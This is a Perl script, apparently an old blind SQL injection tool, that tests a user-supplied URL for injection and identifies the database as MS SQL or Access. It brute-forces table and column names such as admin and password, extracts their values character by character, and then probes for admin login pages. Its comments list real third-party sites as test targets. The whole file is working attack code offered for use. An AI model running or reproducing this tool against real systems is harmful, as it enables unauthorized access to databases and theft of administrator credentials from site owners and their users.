#!/bin/perl
#CopyRight By demonalex[at]dark2s[dot]org
#test url : http://www.hoten.com.cn/news/1type.asp?news_id=433
#test url2 : http://www.3ccs.com.cn/ProductShow.asp?ID=1057
#test proxy : 213.4.59.70:8080


use LWP;
#$url=$ARGV[0];
print("**************************\n");
print('* GET  Version 1.9  BETA *'."\n");
print("* CopyRight By DemonAlex *\n");
print('*   demonalex@163.com    *'."\n");
print("**************************\n");
#if((defined $url) != 1){
print("url: ");
$url=<STDIN>;
chop($url);
$url_mirror=$url;
#}
#defined $url

print("proxy\(\"n\" for none;eg. www.163.com:8080 or 192.168.1.3:808\): ");
$proxy=<STDIN>;
chop($proxy);
if(lc($proxy) eq 'n'){
	$proxy="";
}
#defined $proxy

sub geturl($$);
sub getcontent($$);
@dir=(
"id",
"admin",
"user",
"userpass",
"password",
"passwd",
"pass",
"pwd",
"pword",
"adminpassword",
"adminpass",
"user_pass",
"admin_password",
"user_password",
"user_passwd",
"user_pwd",
"adminpwd",
"dw",
"pws",
"admin_pass",
"admin_password",
"admin_passwd",
"admin_pwd",
"name",
"username",
"name",
"u_name",
"administrators",
"userid",
"adminuser",
"adminpass",
"adminpassword",
"adminname",
"user_name",
"admin_name",
"usr_n",
"usr",
"dw",
"nc",
"uid",
"admin_user",
"admin_username",
"user_admin",
"adminusername",
"manage",
"a_admin",
"x_admin",
"m_admin",
"admin_userinfo",
"clubconfig",
"userinfo",
"config",
"company",
"book",
"users",
"article_admin",
"art",
"bbs");
$count1=0;   #count for exists_table
$count2=0;   #count for exists_row
$count3=0;   #count for group
$count4=0;   #count for 位数
#group structure: %group[组序]{table,row,len}
@value_data=(0,1..9,"a".."z");


if(((&geturl($url,$proxy))==200 && (&geturl("$url"."'",$proxy))==500 && (&geturl("$url"." and 1=1",$proxy))==200 &&
 (&geturl("$url"." and 1=2",$proxy))==500)!=1){
  #havn't SQL Injection
  print("\"$url\" havn\'t SQL Injection.\n");
	print("Press <Enter> to exit.\n");
	$null=<STDIN>;
	exit 1;
}else{
	#have SQL Injection
	print("\"$url\" have SQL Injection.\n");
	#判断数据库类型
	$content=&getcontent("$url"."\'",$proxy);
	if(index(lc($content),'sql server')>0){
		print("Database is Ms SQL Server !\n");
	}elsif(index(lc($content),'jet')>0){
		print("Database is MS Access !\n");
	}elsif(index(lc($content),'access')>0){
		print("Database is MS Access !\n");
	}else{
		print("Unknown Database !\n");
	}
	#判断数据库类型结束
	print("Now crack the table name...\n");
  #get table name
	foreach $table (@dir){
		if(&geturl("$url"." and 0<\(select count\(*\) from $table\)",$proxy)==200){
			print("Table: $table is exists !\n");
			$exists_table[$count1]=$table;
			$count1++;
		}
	}
	#have table name
	$table="";
	#get row name
	print("Now crack the row name...\n");
	foreach $table (@exists_table){
		foreach $row (@dir){
			if(&geturl("$url"." and 0<\(select count\($row\) from $table\)",$proxy)==200){
				print("Row: $row is exists in Table: $table !\n");
				$exists_row[$count2]=$row;
				$count2++;
			}
		}
	}
	#have row name
	$table="";
	$row="";
	#get length
	print("Now crack length...\n");
	foreach $table (@exists_table){
		foreach $row (@exists_row){
			foreach $len (1..30){
				if(&geturl("$url"." and 0<\(select count\(*\) from $table where len\($row\)=$len\)",$proxy)==200){
					print("Table: $table -- Row: $row \'s length is $len !\n");
					$group[$count3]{table}=$table;
					$group[$count3]{row}=$row;
					$group[$count3]{len}=$len;
					$count3++;
				}
			}
		}
	}
	#have length
	$table="";
	$row="";
	#get value
	print("Now crack the value...\n");
	for($count3=0;(defined $group[$count3]);$count3++){
		for($count4=1;($count4<=$group[$count3]{len});$count4++){
			foreach $value (@value_data){
			  if(&geturl("$url"." and 0<\(select top 1 count\(*\) from $group[$count3]{table} where mid\($group[$count3]{row},$count4,1\)=\'$value\'\)",$proxy)==200){
			    print("$value is $count4 for Table: $group[$count3]{table} -- Row: $group[$count3]{row} !\n");
#			    $group[$count3]{$count4}=$value;
			  }
			}
		}
	}
	#have value
	#get entry
	print("Now find the entry...\n");
	$headstream_url=substr($url,7);
  $position=index($headstream_url,"/");
  $headstream_url="http://".substr($headstream_url,0,$position);
  @entry_data=("admin",
  "default",
  "manage",
  "news",
  "login",
  "admin1",
  "login",
  "manage",
  "manager",
  "guanli",
  "denglu",
  "houtai",
  "houtaiguanli",
  "adminlogin",
  "adminuserlogin",
  "user",
  "users",
  "member",
  "members",
  "edit",
  "upload",
  "upfile",
  "backup",
  "config",
  "test",
  "webmaster",
  "root",
  "setting",
  "setup"
  );
  @page_data=("index",
  "login",
  "admin",
  "default",
  "manage",
  "manager",
  "adminlogin",
  "logout",
  "user",
  "users",
  "adduser",
  "adminuser",
  "config",
  "test",
  "webmaster",
  "root",
  "main"
  );
  
  $url_length=length($url_mirror);
  $exclude_postfix_num=rindex($url_mirror,".");
  $postfix1=substr($url_mirror,$exclude_postfix_num,$url_length-$exclude_postfix_num);
  $url_length2=length($postfix1);
  $exclude_postfix_num2=index($postfix1,"?");
  $postfix2=substr($postfix1,0,$exclude_postfix_num2);
#  print("$postfix2\n");

foreach $url1 (@page_data){
	if(&geturl("$headstream_url/$url1"."$postfix2",$proxy)==200){
		print ("$headstream_url/$url1"."$postfix2 is exists !\n");
	}
}

foreach $url2 (@entry_data){
	foreach $url3 (@page_data){
		if(&geturl("$headstream_url/$url2/$url3"."$postfix2",$proxy)==200){
			print ("$headstream_url/$url2/$url3"."$postfix2 is exists !\n");
		}
	}
}


#have entry
	
	print("Press <Enter> to exit.\n");
	$null=<STDIN>;
	exit 1;
}

sub geturl($$){
my $url=shift;
my $proxy1=shift;	
my $agent=LWP::UserAgent->new();
if($proxy!=""){
$agent->proxy('http','http://'.$proxy.'/');
}
my $request=HTTP::Request->new(GET,$url);
my $response=$agent->request($request);
return $response->code;
}

sub getcontent($$){
	my $url=shift;
	my $proxy2=shift;
  my $agent=LWP::UserAgent->new();
  if($proxy!=""){
  	$agent->proxy('http','http://'.$proxy.'/');
  }
  my $request=HTTP::Request->new(GET,$url);
  my $response=$agent->request($request);
  return $response->content;
}